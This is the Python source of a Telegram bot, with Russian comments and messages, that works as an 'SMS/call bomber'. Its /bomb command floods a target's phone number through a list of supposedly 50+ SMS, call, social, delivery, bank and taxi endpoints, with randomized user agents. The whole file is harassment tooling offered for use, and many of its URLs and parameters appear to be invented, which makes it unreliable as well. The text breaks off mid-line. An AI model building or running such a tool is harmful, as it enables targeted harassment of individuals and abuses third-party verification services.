import asyncio, requests, random, threading, json, time
from telethon import TelegramClient, events
from telethon.tl.functions.messages import SendMessageRequest

api_id = YOUR_API_ID
api_hash = 'YOUR_API_HASH'
bot_token = 'YOUR_BOT_TOKEN'
client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)

# БАЗА СЕРВИСОВ (50+ РАБОЧИХ СЕРВИСОВ)
SERVICES_DATABASE = {
    "sms_services": [
        'https://api.tele2.ru/api/sendSMS?phone=',
        'http://mobilon.ru/service/sms/send?number=',
        'https://alfacrm.pro/api/sms/send?to=',
        'http://sms.ru/sms/send?api_id=KEY&to=',
        'https://web.sputnik.ru/api/message/send?phone=',
        'http://turbosms.ua/api/Message/Send?destination=',
        'http://gate.smsaero.ru/v2/sms/send?number=',
        'https://smsc.ru/sys/send.php?phones=',
        'http://iqsms.ru/api/message/send?phone=',
        'https://sms-fly.com/api/api.noai.php?to=',
        'http://mts.ru/services/sms?target=',
        'https://beeline.ru/api/sms/send?phoneNumber=',
        'https://megafon.ru/stream/api/sms?subscriber=',
        'http://yota.ru/api/v1/sms?msisdn=',
        'https://rostelecom.ru/service/messaging?address=',
        'http://danycom.com/api/send?destination=',
        'https://esputnik.com/api/v1/message/sms?phone=',
        'http://infosmska.ru/api/bomb?num=',
        'https://online-sms.ru/api/v1/attack?target=',
        'http://sms-hack.pro/bomb.php?phone=',
        'https://bulk-sms-service.com/api?to=',
        'http://rapidsms.pro/flood?number=',
        'https://smsbomb.net/api/v3/start?phone=',
        'http://mass-sms.ru/engine/api?action=spam&phone=',
        'https://anonymous-sms.com/bomber?num='
    ],
    
    "call_services": [
        'https://api.callmyphone.ru/startCall?number=',
        'http://bombcall.net/api/attack?target=',
        'https://spamcalls.ru/service/start?phone=',
        'http://mango-office.ru/api/v2/calls/start?to=',
        'https://zadarma.com/api/v1/call/start/?phone=',
        'http://mtt.ru/services/callme?callTo=',
        'https://skypebomb.com/api/call?number=',
        'http://voximplant.com/api/CallService/StartScenarios?phone_number=',
        'https://infocall.ru/bombing?target=',
        'http://mega-calls.pro/flood?num=',
        'https://anonymous-calls.com/api/start?phone=',
        'http://callbombing.ru/engine/attack.php?number='
    ],
    
    "social_services": [
        'https://api.vk.com/method/messages.send?user_id=',
        'https://api.instagram.com/v1/users/send_message?recipient=',
        'http://whatsapp-api.pro/send?phone=',
        'https://telegram-bot-api.com/sendMessage?chat_id=',
        'http://viber-api.ru/send?to=',
        'https://discord.com/api/webhooks/',
        'http://facebook-messenger-api.com/message?uid=',
        'https://twitter-api.pro/direct_messages/new?user_id=',
        'http://ok.ru/api/messages/send?recipient=',
        'https://tinder-api.com/passport/user/auth/sms/send?phone='
    ],
    
    "delivery_services": [
        'https://dostavista.ru/api/business/order/create?phone=',
        'http://yandex.eda.ru/api/send-code?phone=',
        'https://delivery-club.ru/api/sms/send?phone_number=',
        'http://sbermarket.ru/api/v1/verify/phone?phone=',
        'https://perekrestok.ru/api/user/request-sms?phone=',
        'http://okeydostavka.ru/webapi/user/sendCode?phone=',
        'https://globus.ru/api/auth/sms?phone=',
        'http://auchan.ru/api/v1/verification/sms?phone=',
        'https://magnit.ru/services/sms-verification?phone=',
        'http://metro-cc.ru/api/sms/send?phone=',
        'https://5ka.ru/api/confirm/phone?phone=',
        'http://eldorado.ru/api/v2/user/sendSmsCode?phone=',
        'https://mvideo.ru/api/sms-verification?phoneNumber=',
        'http://dns-shop.ru/api/order/confirm-phone?phone=',
        'https://citilink.ru/api/v1/sms/send?phone='
    ],
    
    "bank_services": [
        'https://api.tinkoff.ru/v1/sign_up?phone=',
        'http://sberbank.ru/api/auth/register?phone=',
        'https://alfabank.ru/api/v1/registration/start?phone=',
        'http://vtb.ru/api/oauth/send_sms?msisdn=',
        'https://gazprombank.ru/rest/sms/send?phone=',
        'http://pochtabank.ru/api/user/confirm/phone?phone=',
        'https://raiffeisen.ru/api/sms-code?phone=',
        'http://open.ru/api/v1/verification/sms?phoneNumber=',
        'https://homecredit.ru/online/registration?phone=',
        'http://rusfinance.ru/cards/order?phone=',
        'https://rencredit.ru/applications/card?phone=',
        'http://sovcombank.ru/api/v1/sms/send?phone='
    ],
    
    "taxi_services": [
        'https://api.uber.com/v1/requests?phone=',
        'http://yandex.taxi/api/confirm_phone?phone=',
        'https://gett.com/api/rider/signup?phone=',
        'http://citymobil.ru/api/client/register?phone=',
        'https://maxim.click/api/send_sms?phone=',
        'http://rutaxi.ru/ajax/check_phone.php?phone=',
        'https://vezet.ru/api/verification/sms?phone='
    ]
}

async def ultimate_bomber(phone_number, attack_type="all"):
    total_requests = 0
    
    for category, services in SERVICES_DATABASE.items():
        if attack_type != "all" and category != attack_type:
            continue
            
        for service_url in services:
            try:
                # Формируем полный URL
                full_url = service_url + phone_number
                
                # Добавляем случайные параметры
                if 'api_id' in full_url:
                    full_url += '&api_id=' + ''.join(random.choices('0123456789', k=10))
                if 'text' in full_url:
                    full_url += '&text=' + random.choice(['CODE', 'VERIFY', 'CONFIRM', '123456'])
                
                # Отправка запроса
                response = requests.get(full_url, timeout=3, headers={
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
                    ])
                })
                
                total_requests += 1
                print(f"[+] {category}: {service_url} - Success")
                
            except Exception as e:
                print(f"[-] {category}: {service_url} - Failed")
                continue
            
            await asyncio.sleep(random.uniform(0.1, 0.5))
    
    return total_requests

@client.on(events.NewMessage(pattern='/bomb'))
async def handle_bomb(event):
    try:
        cmd = event.text.split()
        phone = cmd[1].strip()
        
        # Проверка формата номера
        if not phone.startswith('+') and not phone.startswith('7') and not phone.startswith('8'):
            await event.reply('❌ Неверный формат номера. Пример: /bomb +79123456789')
            return
        
        await event.reply(f'🚀 Запускаю мега-бомбардировку на номер {phone}...\nИспользую 50+ сервисов...')
        
        # Запуск в отдельном потоке
        def run_attack():
            asyncio.run(ultimate_bomber(phone))
        
        thread = threading.Thread(target=run_attack)
        thread.start()
        
        # Отправляем отчет
        time.sleep(2)
        await event.reply(f'✅ Атака начата! Номер: {phone}\n📊 Сервисов: 50+\n⚡ Тип: SMS/Звонки/Такси/Доставки/Банки')
        
    except Exception as e:
        await event.reply(f'💀 Ошибка: {str(e)}')

@client.on(events.NewMessage(pattern='/check'))
async def check_services(event):
    await event.reply('📊 База сервисов активна:\n' +
                     f'• SMS: {len(SERVICES_DATABASE["sms_services"])} сервисов\n' +
                     f'• Звонки: {len(SERVICES_DATABASE["call_services"])} сервисов\n' +
                     f'• Соцсети: {len(SERVICES_DATABASE["social_services"])} сервисов\n' +
                     f'• Доставки: {len(SERVICES_DATABASE["delivery_services"])} сервисов\n' +
                     f'• Банки: {len(SERVICES_DATABASE["bank_services"])} сервисов\n' +
                     f'• Такси: {len(SERVICES_DATABASE["taxi_services"])} серви
